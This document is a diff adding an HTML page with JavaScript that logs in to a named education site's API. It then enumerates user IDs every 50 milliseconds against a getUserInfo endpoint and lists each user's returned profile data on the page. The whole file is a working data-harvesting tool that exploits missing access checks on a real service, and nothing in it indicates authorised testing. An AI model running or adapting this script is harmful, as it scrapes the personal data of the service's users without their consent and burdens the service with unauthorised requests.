@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Document</title>
+
+    <style>
+        #travelResult {
+            display: none;
+        }
+
+        .memo{
+            margin: 30px 0px 15px;
+        }
+    </style>
+</head>
+
+<body>
+
+    <h4>Directory Traversal Attack: getUserInfo</h4>
+
+    <form action="javascript: login()">
+        <label>userName</label>
+        <input type="text" name="username" id="username">
+        <label>password</label>
+        <input type="password" name="password" id="password">
+
+        <button type="submit">Login</button>
+        <span id="loginResult"></span>
+    </form>
+
+
+    <div class="memo">
+        <a href="http://wiki.feifanuniv.com/pages/viewpage.action?pageId=21595884" target="_blank" rel="noopener noreferrer">
+            <span>target api</span>
+        </a>
+    </div>
+
+    <button onclick="traveGetUserInfo()">Start Travel</button>
+    <button onclick="stopTravel()">Stop Travel</button>
+
+    <div id="travelResult">
+        <h5>Traveling: <span id="count"></span></h5>
+        <ul id="result" />
+    </div>
+
+    <script>
+        const login_api = "http://www.qingshuxuetang.com/qingshu-svc-home/v5_5/home/user/login";
+        const userInfo_api = "http://www.qingshuxuetang.com/qingshu-svc-home/v5_3/home/user/getUserInfo";
+        const $resultUL = document.getElementById("result");
+        const $count = document.getElementById("count");
+        let token = "";
+        let userId = 10000;
+        let interval = null;
+
+        function login() {
+            let xhr = new XMLHttpRequest();
+            xhr.open("POST", login_api);
+            xhr.setRequestHeader("Content-type", "application/json");
+
+            xhr.onreadystatechange = function () {
+                if (xhr.readyState === 4 && xhr.status === 200) {
+                    document.getElementById("loginResult").innerText = xhr.responseText;
+
+                    let response = JSON.parse(xhr.responseText);
+                    if (response && response.hr === 0 && response.data) {
+                        token = response.data.accessToken;
+                    }
+                }
+            };
+
+            let requestBody = {
+                "name": document.getElementById("username").value,
+                "password": "111111"
+            };
+            xhr.send(JSON.stringify(requestBody));
+        }
+
+        function traveGetUserInfo() {
+            document.getElementById("travelResult").style.display = "block";
+
+            interval = setInterval(function () {
+                getUserInfo(userId);
+                $count.innerText = userId;
+                userId++;
+
+                if (userId > 9999999999) { // if 1000/s => 11Day
+                    clearInterval(interval);
+                }
+            }, 50);
+        }
+
+        function stopTravel() {
+            clearInterval(interval);
+        }
+
+        function getUserInfo(userId) {
+            let xhr = new XMLHttpRequest();
+            xhr.open("POST", userInfo_api, false)
+            xhr.setRequestHeader("Content-type", "application/json");
+            xhr.setRequestHeader("User-Agent-QS", "QSXT");
+            xhr.setRequestHeader("Authorization-QS", token);
+
+            xhr.onreadystatechange = function () {
+                if (xhr.readyState === 4 && xhr.status === 200) {
+                    let response = JSON.parse(xhr.responseText);
+                    if (response && response.hr === 0 && response.data) {
+                        $resultUL.innerHTML += "<li><span style='font-style: italic;'>" + userId + " :  </span><span>" + JSON.stringify(response.data) + "</span</li>"
+                    }
+                }
+            };
+
+            let requestBody = { userId: userId };
+            xhr.send(JSON.stringify(requestBody));
+        }
+
+    </script>
+</body>
+
+</html>
